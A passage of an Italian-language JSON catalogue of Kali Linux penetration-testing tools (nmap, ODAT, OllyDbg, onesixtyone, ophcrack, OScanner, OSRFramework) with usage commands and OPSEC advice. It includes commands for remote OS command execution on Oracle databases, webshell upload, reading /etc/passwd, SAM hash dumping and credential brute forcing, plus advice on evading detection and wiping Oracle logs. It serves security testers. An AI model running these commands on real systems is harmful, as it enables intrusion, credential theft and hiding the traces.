target.com\n\n# === NSE VULNERABILITY SCANNING ===\n# Tutti gli script vuln\nnmap --script vuln target.com\n# SMB vulnerabilità (EternalBlue, etc)\nnmap --script smb-vuln* -p445 target\n# SSL/TLS issues\nnmap --script ssl* -p443 target\n# Script specifici con args\nnmap --script http-sql-injection --script-args http-sql-injection.url=\"/search?q=test\" target\n\n# === SERVICE-SPECIFIC ENUM ===\n# SMB enumeration\nnmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p445 target\n# HTTP enumeration\nnmap --script http-enum,http-headers,http-methods,http-title -p80,443,8080 target\n# LDAP/AD\nnmap --script ldap-rootdse,ldap-search -p389,636 target\n\n# === OUTPUT FORMATS ===\nnmap -oA scan_all target        # Tutti i formati\nnmap -oX scan.xml target        # XML per parsing\nnmap -oG scan.grep target       # Grepable\nnmap --stylesheet scan.xsl -oX report.xml target  # HTML report\n\n# === PIPELINE AUTOMATION ===\n# Scan range, estrai IP attivi, scan profondo\nnmap -sn 192.168.1.0/24 -oG - | grep \"Up\" | awk '{print $2}' > alive.txt\nnmap -sS -sV -p- -iL alive.txt -oA detailed_scan\n\n# === NMAP + NSE EXPLOITATION ===\n# FTP anonymous + vuln check\nnmap --script ftp-anon,ftp-vuln* -p21 target\n# RCE check su servizi noti\nnmap --script http-vuln-cve2017-5638 -p80,8080 target  # Struts\nnmap --script rdp-vuln-ms12-020 -p3389 target          # BlueKeep\n\n# === PERFORMANCE TUNING ===\nnmap -T4 --min-rate 1000 --max-retries 2 -p- target     # Fast\nnmap --host-timeout 30m --max-scan-delay 1s target      # Reliable</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Recon</strong>, discovery e enumeration di qualsiasi rete.</p><p>Nel <strong>Pentesting</strong>, base di ogni assessment.</p><p><strong>Vulnerability Scanning</strong> con NSE scripts.</p><p><strong>Stealth Recon</strong> con tecniche di evasion.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> Scan SYN visibili a IDS/firewall. Usa -T1 o --max-rate per stealth. Decoy (-D) e fragmentazione (-f) per evasion. Idle scan (-sI) per anonimato totale. NSE scripts generano traffico specifico identificabile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "odat",
    "name": "odat",
    "version": "5.1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/odat/",
    "desc": "Oracle Database Attacking Tool: enumeration, privilege escalation, code execution su DB Oracle.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ODAT (Oracle Database Attacking Tool) è uno strumento open-source progettato specificamente per testare la sicurezza di database Oracle. Permette di eseguire enumerazione, privilege escalation, esecuzione di comandi sul sistema operativo e manipolazione di dati attraverso vulnerabilità e misconfigurazioni comuni di Oracle Database. ODAT automatizza numerose tecniche di attacco che normalmente richiederebbero conoscenze approfondite di Oracle internals, rendendole accessibili ai penetration tester. Supporta tutte le versioni principali di Oracle Database dalla 9i alla 21c. Lo strumento è modulare e ogni modulo implementa una tecnica di attacco specifica, dal brute force dei SID all'upload di file tramite il database.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione e discovery:</strong> ODAT può identificare SID (System Identifier) Oracle tramite brute force o dizionario, enumerare account con password di default, scoprire il ruolo e i privilegi dell'utente corrente e listare i database link configurati. Il modulo sidguesser testa migliaia di SID comuni in pochi secondi. Il modulo passwordguesser verifica combinazioni username/password di default specifiche per Oracle.</p><p><strong>Privilege escalation:</strong> Include tecniche per elevare i privilegi da utente standard a DBA tramite exploitation di PL/SQL injection, grant di privilegi tramite package vulnerabili (DBMS_CDC_SUBSCRIBE, DBMS_XMLQUERY) e manipolazione di Java permissions. Il modulo privesc automatizza la catena di escalation testando multiple tecniche in sequenza fino al successo.</p><p><strong>Esecuzione comandi e file operations:</strong> Una volta ottenuti privilegi sufficienti, ODAT permette di eseguire comandi sul sistema operativo sottostante tramite Java stored procedures, external tables, DBMS_SCHEDULER o Oracle Text. Supporta anche upload e download di file tramite UTL_FILE, DBMS_XSLPROCESSOR e DBMS_LOB, permettendo di depositare webshell o esfiltrare dati sensibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>ODAT si utilizza specificando il modulo desiderato seguito dai parametri di connessione al database Oracle.</p><pre><code># Enumerazione SID\nodat sidguesser -s 10.0.0.5 -p 1521\n\n# Brute force password con account di default\nodat passwordguesser -s 10.0.0.5 -d ORCL\n\n# Test tutti i moduli con credenziali note\nodat all -s 10.0.0.5 -d ORCL -U scott -P tiger\n\n# Esecuzione comando OS tramite Java\nodat java -s 10.0.0.5 -d ORCL -U dba_user -P pass --exec whoami\n\n# Upload file sul server\nodat utlfile -s 10.0.0.5 -d ORCL -U dba_user -P pass --putFile /tmp/ shell.jsp ./shell.jsp\n\n# Lettura file dal server\nodat externaltable -s 10.0.0.5 -d ORCL -U user -P pass --getFile /etc/passwd result.txt</code></pre><p>Il modulo 'all' è particolarmente utile per un assessment completo: testa automaticamente tutte le tecniche disponibili e genera un report dei vettori di attacco funzionanti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>ODAT è essenziale durante penetration test su infrastrutture che includono database Oracle, comuni in ambienti enterprise e governativi. Un tester che ha scoperto un listener Oracle sulla porta 1521 inizia con sidguesser per identificare i SID disponibili, poi tenta il login con credenziali di default. Se ottiene accesso con un utente a basso privilegio, utilizza i moduli di privilege escalation per ottenere DBA. Con privilegi DBA, può eseguire comandi sul sistema operativo per ottenere una shell sul server database, tipicamente un sistema critico con accesso a dati sensibili. ODAT è anche utilizzato per verificare che le installazioni Oracle siano state hardened correttamente, testando la presenza di account di default, package vulnerabili e configurazioni permissive di UTL_FILE_DIR.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I tentativi di brute force SID e password generano numerosi errori di autenticazione nei log Oracle (audit trail). L'esecuzione di comandi OS tramite Java stored procedures produce voci specifiche nei log del database. L'uso di package come UTL_FILE e DBMS_SCHEDULER per operazioni insolite può attivare alert se Oracle Database Vault o audit policy sono configurati.</p><p><strong>Impatto operativo:</strong> Tentativi multipli di autenticazione falliti possono causare il lockout degli account se configurato. L'esecuzione di comandi OS può essere bloccata da security policy restrittive sulla JVM Oracle. Le operazioni su file tramite UTL_FILE sono limitate alle directory definite in UTL_FILE_DIR.</p><p><strong>Mitigazioni:</strong> Ridurre il rate dei tentativi di brute force per evitare lockout e detection. Verificare i privilegi dell'utente prima di tentare operazioni che richiedono DBA. Utilizzare connessioni cifrate (TCPS) quando disponibili. Pulire le tracce nei log Oracle al termine dell'operazione se i privilegi lo permettono. Preferire tecniche che generano meno artefatti come external tables rispetto a Java procedures.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "ollydbg",
    "name": "ollydbg",
    "version": "1.10",
    "icon": "../app/icons/ollydbg-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ollydbg/",
    "desc": "Debugger x86 per Windows, usato per analisi malware e reverse engineering di binari PE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>OllyDbg</strong> è un debugger assembly-level per Windows x86 che ha definito lo standard per il reverse engineering user-friendly. Nonostante non sia più sviluppato attivamente (l'ultima versione stabile è 1.10 del 2004, con 2.01 in beta), rimane uno dei debugger più utilizzati grazie alla sua interfaccia intuitiva e al ricco ecosistema di plugin. OllyDbg eccelle nell'analisi di binari PE senza simboli: il suo engine di analisi ricostruisce automaticamente funzioni, loop, switch statements, e chiamate API. Include disassembler integrato, hex editor, memory map viewer, e capacità di patching in memoria. Su Kali Linux viene eseguito tramite Wine per analizzare malware Windows in ambiente isolato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intelligent Disassembly:</strong> L'engine di analisi va oltre il semplice disassembly: riconosce funzioni, identifica loop e branch, risolve chiamate API Windows, e annota automaticamente il codice. Particolarmente efficace su binari stripped senza simboli di debug.</p><p><strong>Dynamic Debugging:</strong> Supporto completo per debugging: breakpoint software e hardware, conditional breakpoints, memory breakpoints, step into/over/out, watch expressions, e modifica registri/memoria in tempo reale.</p><p><strong>Plugin Ecosystem:</strong> Centinaia di plugin disponibili: OllyDump per dump di processi unpacked, OllyScript per automazione, anti-anti-debug plugin per bypassare protezioni, signature scanner, e molto altro.</p><p><strong>Binary Patching:</strong> Modifica direttamente byte in memoria o su disco. Assembla istruzioni inline, applica NOP, modifica jump conditions. Salva le modifiche come nuovo eseguibile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Su Kali Linux, OllyDbg viene eseguito tramite Wine per analizzare binari Windows.</p><pre><code># Avvio OllyDbg con Wine\nwine ~/.wine/drive_c/ollydbg/ollydbg.exe\n\n# Carica eseguibile da analizzare\n# File -> Open -> seleziona file PE (.exe, .dll)\n\n# Shortcut essenziali:\n# F2 - Toggle breakpoint su istruzione corrente\n# F7 - Step into (entra nelle call)\n# F8 - Step over (esegue call senza entrare)\n# F9 - Run (continua esecuzione)\n# Ctrl+F9 - Execute till return\n# F12 - Pause execution\n# Ctrl+G - Go to address\n# Ctrl+F - Search for command\n# Ctrl+B - Search for binary pattern\n\n# Analisi strings\n# Right-click -> Search for -> All referenced strings\n\n# Trova chiamate API\n# Right-click -> Search for -> All intermodular calls\n\n# Patching\n# Seleziona istruzione -> Space -> modifica assembly\n# Right-click -> Copy to executable -> Save file</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Analysis</strong>, OllyDbg permette analisi dinamica di sample Windows osservando comportamento in tempo reale: quali API vengono chiamate, quali file vengono creati, quali connessioni di rete vengono stabilite.</p><p>Nel <strong>Software Reverse Engineering</strong>, per comprendere il funzionamento di software closed-source: algoritmi di validazione licenze, protocolli di comunicazione proprietari, logica di business non documentata.</p><p>Per <strong>Exploit Development</strong>, debugging di shellcode e payload per verificare corretto funzionamento. Analisi di crash per identificare vulnerabilità sfruttabili.</p><p>Durante <strong>CTF e Crackme</strong>, OllyDbg è lo strumento classico per risolvere challenge di reverse engineering. L'interfaccia user-friendly lo rende ideale per chi si avvicina al reversing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Ambiente Isolato:</strong> MAI eseguire malware sul sistema principale. Usare VM dedicata con snapshot, network isolato, e shared folder disabilitati.</p><p><strong>Anti-Debug Detection:</strong> Malware sofisticato rileva la presenza di debugger (IsDebuggerPresent, timing checks). Usare plugin anti-anti-debug come HideDebugger o ScyllaHide.</p><p><strong>Limitazione x86:</strong> OllyDbg supporta solo binari x86 32-bit. Per malware x64, usare x64dbg che offre interfaccia simile ma supporta architettura 64-bit.</p><p><strong>Wine Compatibility:</strong> Non tutto il malware Windows funziona correttamente sotto Wine. Per analisi accurata, considerare VM Windows dedicata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "onesixtyone",
    "name": "onesixtyone",
    "version": "0.3.4",
    "icon": "../app/icons/onesixtyone-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/onesixtyone/",
    "desc": "Scanner SNMP veloce per brute force community string e discovery dispositivi di rete.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Onesixtyone</strong> è uno scanner SNMP ad alte prestazioni specializzato nel brute force di community string su larga scala. Il nome deriva dalla porta UDP 161 utilizzata da SNMP. A differenza di scanner generici, onesixtyone è ottimizzato specificamente per discovery SNMP: invia richieste GetRequest UDP in parallelo a migliaia di host simultaneamente, testando liste di community string. L'architettura asincrona permette di scansionare intere subnet di classe B in pochi minuti. Trova dispositivi con community string default (public, private), deboli, o custom, prerequisito essenziale per enumerazione SNMP approfondita con tool come snmpwalk.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Massively Parallel:</strong> Invia fino a 1000+ richieste UDP simultanee senza attendere risposte. L'architettura asynchronous fire-and-forget massimizza il throughput su reti di grandi dimensioni dove scan sequenziali richiederebbero ore.</p><p><strong>Community String Brute Force:</strong> Testa liste di community string contro ogni host. Include dizionari di community comuni (public, private, admin, manager, cisco, etc.) e supporta wordlist custom per ambienti specifici.</p><p><strong>Dual Input Mode:</strong> Accetta target come range CIDR, singoli IP, o file di host. Simultaneamente, community string possono essere specificate inline o da file, permettendo combinazioni flessibili.</p><p><strong>Output Minimale:</strong> Riporta solo successi: IP e community string funzionante. Output pulito ideale per piping verso altri tool o parsing automatizzato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Sintassi semplice ottimizzata per scan rapidi su reti enterprise.</p><pre><code># Scan singola community su subnet\nonesixtyone 192.168.1.0/24 public\n\n# Brute force con file di community string\nonesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.0/24\n\n# Scan da file di host target\nonesixtyone -c communities.txt -i targets.txt\n\n# Scan range con community multiple inline\nonesixtyone 10.0.0.0/16 public private admin\n\n# Output verboso per debug\nonesixtyone -d 192.168.1.1 public\n\n# Combinazione: hosts da file, community da file\nonesixtyone -c /path/to/communities.txt -i /path/to/hosts.txt\n\n# Output tipico:\n# 192.168.1.1 [public] Linux router\n# 192.168.1.5 [private] Cisco IOS\n# 192.168.1.10 [admin] HP ProCurve\n\n# Pipeline con snmpwalk per enumerazione completa\nonesixtyone -c dict.txt 192.168.1.0/24 | awk '{print $1}' | \\\n  while read ip; do snmpwalk -c public -v2c $ip; done</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Network Discovery</strong>, onesixtyone identifica rapidamente tutti i dispositivi con SNMP abilitato in una rete. Trova router, switch, stampanti, UPS, access point, e qualsiasi dispositivo gestibile via SNMP, spesso inclusi sistemi dimenticati o shadow IT.</p><p>Nel <strong>Penetration Testing</strong>, SNMP con community string deboli è un vettore d'attacco critico. Community 'public' permette lettura di informazioni sensibili (routing tables, ARP cache, utenti). Community 'private' spesso permette write access per riconfigurare dispositivi.</p><p>Per <strong>Security Assessment</strong>, verifica che policy aziendali di hardening SNMP siano implementate. Identifica dispositivi che usano ancora community default o deboli, violando best practice di sicurezza.</p><p>Nell'<strong>Asset Inventory</strong>, scan periodici con onesixtyone alimentano CMDB identificando nuovi dispositivi di rete. L'output include sysDescr che identifica vendor e modello.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffic Pattern:</strong> Genera burst di pacchetti UDP 161 facilmente identificabili. Network monitoring e SIEM rilevano volume anomalo di richieste SNMP. IDS ha signature specifiche per SNMP brute force.</p><p><strong>Community in Chiaro:</strong> SNMP v1/v2c trasmette community string in chiaro. Chiunque sniffi la rete può intercettare le community testate e quelle valide. Usare SNMPv3 con autenticazione per ambienti sicuri.</p><p><strong>Rate Limiting:</strong> Alcuni dispositivi implementano rate limiting o blocco IP dopo troppi tentativi falliti. Distribuire scan su periodi più lunghi per evitare detection e lockout.</p><p><strong>Mitigazioni:</strong> Ridurre parallelismo con -w (wait) flag se disponibile. Usare wordlist mirate invece di dizionari enormi. Preferire scan durante orari di alto traffico per mimetizzarsi. Combinare con altri traffic per mascherare pattern.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "ophcrack",
    "name": "ophcrack",
    "version": "3.8.0",
    "icon": "../app/icons/ophcrack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ophcrack/",
    "desc": "Cracker password Windows via rainbow tables LM/NTLM con interfaccia grafica.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ophcrack è uno strumento per il cracking di password Windows che utilizza rainbow tables pre-calcolate per recuperare password da hash LM e NTLM in tempi estremamente rapidi. A differenza dei tool di brute force tradizionali, ophcrack sfrutta il compromesso tempo-memoria delle rainbow tables per trovare password in secondi o minuti anziché ore o giorni. Dispone di un'interfaccia grafica intuitiva che mostra il progresso del cracking in tempo reale, ma può essere utilizzato anche da riga di comando. Il progetto include tabelle gratuite per password alfanumeriche fino a 14 caratteri per LM hash. È disponibile anche come LiveCD avviabile per cracking offline di sistemi Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cracking con rainbow tables:</strong> Ophcrack utilizza rainbow tables ottimizzate per hash LM e NTLM, permettendo di recuperare password in una frazione del tempo richiesto dal brute force. Le tabelle gratuite coprono password alfanumeriche, mentre le tabelle a pagamento (ophcrack special tables) estendono il charset a simboli e aumentano la lunghezza massima. Il tasso di successo per password di 8 caratteri alfanumerici è superiore al 99%.</p><p><strong>Interfaccia grafica e CLI:</strong> L'interfaccia grafica mostra in tempo reale quali hash sono stati craccati, il tempo trascorso e la percentuale di completamento delle tabelle. Supporta il caricamento di hash da file SAM locali, dump PWDUMP, file CSV e import diretto dalla macchina corrente. La modalità CLI permette l'automazione e l'integrazione in script di assessment.</p><p><strong>LiveCD per cracking offline:</strong> Ophcrack è disponibile come LiveCD (basato su Slitaz Linux) che permette di avviare un sistema Windows dal CD, estrarre automaticamente i file SAM e SYSTEM, e iniziare il cracking senza necessità di installazione. Questo è utile per assessment fisici dove si ha accesso diretto alla macchina target. Il LiveCD include tabelle rainbow pre-caricate per un cracking immediato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ophcrack può essere utilizzato in modalità grafica o da riga di comando con hash ottenuti tramite dump del database SAM.</p><pre><code># Avvio interfaccia grafica\nophcrack\n\n# Cracking da riga di comando con tabelle specifiche\nophcrack -g -d /path/to/tables -t /path/to/tables -f hashes.txt\n\n# Caricamento hash in formato pwdump\nophcrack -g -d /usr/share/ophcrack/tables -f pwdump.txt\n\n# Estrazione hash SAM (con strumenti esterni)\nsecretsdump.py -sam SAM -system SYSTEM LOCAL\n# Poi importare il risultato in ophcrack\n\n# Uso con tabelle multiple\nophcrack -d /tables/vista_free:/tables/xp_free -f hashes.txt</code></pre><p>Per risultati ottimali, scaricare le tabelle rainbow appropriate dal sito ufficiale. Le tabelle XP free coprono password alfanumeriche, le tabelle Vista free supportano hash NTLM.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ophcrack è utilizzato principalmente in due scenari: audit di password aziendali e recupero password in contesti forensi. In un audit di sicurezza, dopo aver ottenuto un dump del database SAM o del file NTDS.dit di Active Directory, il team di sicurezza carica gli hash in ophcrack per verificare quanti utenti utilizzano password deboli craccabili tramite rainbow tables. Questo fornisce metriche concrete sulla qualità delle password nell'organizzazione. In contesti forensi, ophcrack permette di accedere a sistemi Windows protetti da password quando è necessario analizzare il contenuto del disco. Il LiveCD è particolarmente utile quando non è possibile rimuovere il disco per montarlo su un altro sistema. Ophcrack è anche utilizzato per dimostrare ai clienti la debolezza degli hash LM, ancora presenti in molti ambienti legacy.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di ophcrack è un'operazione offline che non genera traffico di rete né eventi sui sistemi target. Il cracking avviene interamente sulla macchina dell'attaccante utilizzando hash precedentemente ottenuti. L'unico punto di rilevamento è la fase di estrazione degli hash (dump SAM, DCSync, etc.).</p><p><strong>Impatto operativo:</strong> Le rainbow tables richiedono spazio disco significativo: le tabelle complete possono occupare centinaia di GB. Il cracking è limitato alle password coperte dal charset e dalla lunghezza delle tabelle disponibili. Hash NTLM con salt o password molto lunghe non sono vulnerabili a questo approccio.</p><p><strong>Mitigazioni:</strong> Assicurarsi di avere tabelle appropriate per il tipo di hash target (LM vs NTLM). Combinare ophcrack con tool di brute force (hashcat, john) per password non coperte dalle tabelle. Verificare che il dump degli hash sia completo e in formato corretto prima di iniziare il cracking. Per audit aziendali, documentare la catena di custodia degli hash estratti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "oscanner",
    "name": "oscanner",
    "version": "1.0.6",
    "icon": "../app/icons/oscanner-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/oscanner/",
    "desc": "Scanner per database Oracle: enumeration SID, account, privilegi e vulnerabilità note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>OScanner è uno strumento di assessment per database Oracle scritto in Java che automatizza l'enumerazione di informazioni critiche dall'istanza database. Esegue discovery di SID, test di account con password di default, enumerazione di privilegi, ruoli, audit policy e versioni dei componenti installati. OScanner è progettato per fornire una panoramica completa della superficie di attacco di un'installazione Oracle in modo rapido e automatizzato. Lo strumento include un plugin per l'interfaccia grafica che visualizza i risultati in formato strutturato ad albero. Supporta Oracle Database dalla versione 9i alla 19c ed è incluso in Kali Linux come strumento di enumerazione database.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione SID e service name:</strong> OScanner effettua il discovery dei SID Oracle disponibili sul listener attraverso query TNS e dizionario di SID comuni. Identifica anche i service name registrati, le istanze in esecuzione e la versione del listener. Questa fase iniziale è cruciale perché senza un SID valido non è possibile autenticarsi al database Oracle.</p><p><strong>Test account e password di default:</strong> Include un database completo di combinazioni username/password di default per Oracle, includendo account di sistema (SYS, SYSTEM, DBSNMP), account applicativi (SCOTT/TIGER, HR, OE) e account di componenti opzionali. Il tool verifica sistematicamente ogni combinazione e reporta gli account attivi con password di default, una delle vulnerabilità più comuni nelle installazioni Oracle.</p><p><strong>Enumerazione privilegi e configurazione:</strong> Una volta autenticato, OScanner enumera i privilegi di sistema e oggetto dell'utente, i ruoli assegnati, le policy di audit attive, i database link configurati e le versioni dei componenti Oracle installati. Queste informazioni sono essenziali per pianificare attacchi di privilege escalation e per identificare misconfigurazioni di sicurezza.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>OScanner si invoca da riga di comando specificando l'host target e opzionalmente il file di output per i risultati.</p><pre><code># Scan completo di un host Oracle\noscanner -s 10.0.0.5\n\n# Scan con porta personalizzata\noscanner -s 10.0.0.5 -P 1522\n\n# Scan con output su file\noscanner -s 10.0.0.5 -f report_oracle.xml\n\n# Visualizzazione risultati con reportviewer\nreportviewer report_oracle.xml\n\n# Scan di range di host\nfor ip in $(seq 1 254); do oscanner -s 192.168.1.$ip; done</code></pre><p>I risultati vengono visualizzati in console durante lo scan e possono essere salvati in formato XML per analisi successiva tramite il reportviewer incluso. Lo strumento testa automaticamente tutte le fasi di enumerazione in sequenza.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>OScanner è lo strumento di prima scelta quando durante un penetration test viene identificato un listener Oracle (tipicamente sulla porta 1521). Il workflow standard prevede prima l'enumerazione dei SID disponibili, poi il test delle credenziali di default, e infine l'enumerazione dettagliata con gli account trovati. In audit di conformità, OScanner viene utilizzato per verificare che tutti gli account di default siano stati disabilitati o abbiano password cambiate, come richiesto da standard come CIS Benchmark per Oracle Database. In scenari di internal assessment, dove il tester ha già credenziali di rete, OScanner permette di mappare rapidamente tutte le istanze Oracle nell'infrastruttura e identificare quelle con configurazioni di sicurezza deboli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I tentativi di connessione con credenziali errate vengono registrati nell'audit trail di Oracle se il failed login auditing è abilitato. L'enumerazione dei SID tramite TNS può generare log sul listener Oracle. Multiple connessioni rapide dallo stesso IP sorgente possono attivare alert in sistemi di monitoraggio database (Oracle Audit Vault, DbProtect).</p><p><strong>Impatto operativo:</strong> Tentativi multipli di login con password errate possono causare il lockout di account se i profile Oracle hanno FAILED_LOGIN_ATTEMPTS configurato. Lo scan genera traffico TNS facilmente identificabile. L'enumerazione con account a basso privilegio è relativamente sicura ma comunque tracciata.</p><p><strong>Mitigazioni:</strong> Ridurre il rate dello scanning per evitare lockout account. Verificare la policy di lockout Oracle prima di iniziare i test di password. Utilizzare un singolo account valido per l'enumerazione dettagliata piuttosto che testare tutti gli account di default. Eseguire lo scan durante orari di attività normale per mimetizzarsi nel traffico legittimo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "osrframework",
    "name": "osrframework",
    "version": "0.20.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/osrframework/",
    "desc": "Suite OSINT per ricerca username, email, domini su centinaia di piattaforme online.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>OSRFramework è una suite di strumenti OSINT (Open Source Intelligence) sviluppata in Python per la ricerca di informazioni su persone e entità attraverso centinaia di piattaforme online. Il framework include diversi tool specializzati: usufy per la ricerca di username, mailfy per la verifica di email, searchfy per ricerche su motori, phonefy per numeri di telefono e domainfy per informazioni sui domini. OSRFramework può interrogare oltre 300 piattaforme simultaneamente per verificare la presenza di un username o email, costruendo un profilo digitale completo del target. È uno strumento fondamentale nella fase di reconnaissance per identificare la presenza online di individui e organizzazioni durante investigazioni OSINT.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Ricerca username multi-piattaforma (usufy):</strong> Usufy verifica la presenza di un username su centinaia di social network, forum, piattaforme di coding, servizi cloud e siti web. Per ogni piattaforma restituisce l'URL del profilo trovato, permettendo di costruire una mappa completa della presenza online di un individuo. I risultati possono essere esportati in formati CSV, JSON, HTML e grafici per analisi visuale delle correlazioni.</p><p><strong>Verifica email e domini:</strong> Mailfy verifica se un indirizzo email è registrato su piattaforme specifiche, rivelando account associati. Domainfy raccoglie informazioni WHOIS, DNS, e reputazione per nomi di dominio. Questi moduli complementano la ricerca per username fornendo vettori di ricerca alternativi quando il username non è noto.</p><p><strong>Correlazione e reporting:</strong> OSRFramework integra i risultati di tutti i moduli in un database locale che permette correlazioni tra diverse ricerche. L'interfaccia web opzionale (OSRFConsole) offre un ambiente interattivo per gestire investigazioni complesse. I report generati includono grafici di relazione tra entità e timeline di attività.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ogni tool della suite si invoca separatamente con i parametri di ricerca specifici.</p><pre><code># Ricerca username su tutte le piattaforme\nusufy -n targetuser -p all\n\n# Ricerca username su piattaforme specifiche\nusufy -n targetuser -p twitter facebook github linkedin\n\n# Verifica email su piattaforme note\nmailfy -m target@email.com\n\n# Ricerca informazioni dominio\ndomainfy -n targetdomain -t all\n\n# Ricerca numero di telefono\nphonefy -n +39123456789\n\n# Export risultati in formato JSON\nusufy -n targetuser -p all -o json\n\n# Ricerca multipla di username\nusufy -n user1 user2 user3 -p all</code></pre><p>I risultati vengono salvati automaticamente nella cartella di output con timestamp. La flag -p all interroga tutte le piattaforme disponibili ma richiede tempo significativo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>OSRFramework è utilizzato nella fase iniziale di un engagement per costruire il profilo digitale di un target. Durante un'operazione di social engineering, conoscere i social network utilizzati dal target permette di personalizzare il pretesto e scegliere il canale di contatto più efficace. In investigazioni OSINT, la ricerca di un username trovato in un data breach su centinaia di piattaforme permette di collegare identità diverse e ricostruire la presenza online completa. I team di threat intelligence utilizzano OSRFramework per tracciare attori malevoli attraverso username e email trovati in forum underground. In assessment di sicurezza aziendale, il framework viene usato per identificare account personali dei dipendenti che potrebbero esporre informazioni sensibili sull'organizzazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste alle piattaforme vengono effettuate direttamente dall'IP dell'operatore e possono essere tracciate. Alcune piattaforme implementano rate limiting e CAPTCHA che possono bloccare le ricerche automatiche. Le API di alcuni servizi loggano le query di ricerca e potrebbero notificare il target di ricerche sul proprio profilo.</p><p><strong>Impatto operativo:</strong> La ricerca su tutte le piattaforme genera centinaia di richieste HTTP che possono essere lente e soggette a timeout. Alcune piattaforme potrebbero bannare l'IP sorgente per attività sospetta. I risultati possono includere falsi positivi dove lo stesso username appartiene a persone diverse.</p><p><strong>Mitigazioni:</strong> Utilizzare proxy o VPN per distribuire le richieste su IP diversi. Limitare la ricerca alle piattaforme più rilevanti con -p invece di usare -p all. Verificare manualmente i risultati per eliminare falsi positivi. Distribuire le ricerche nel tempo per evitare rate limiting. Non accedere direttamente ai profili trovati per evitare di lasciare tracce di visualizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "p0f",
    "name": "p0f",
    "version": "3.09b",
    "icon": "../app/icons/p0f-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/p0f/",
    "desc": "Passive OS fingerprinting: identifica sistemi operativi analizzando traffico TCP/IP.",
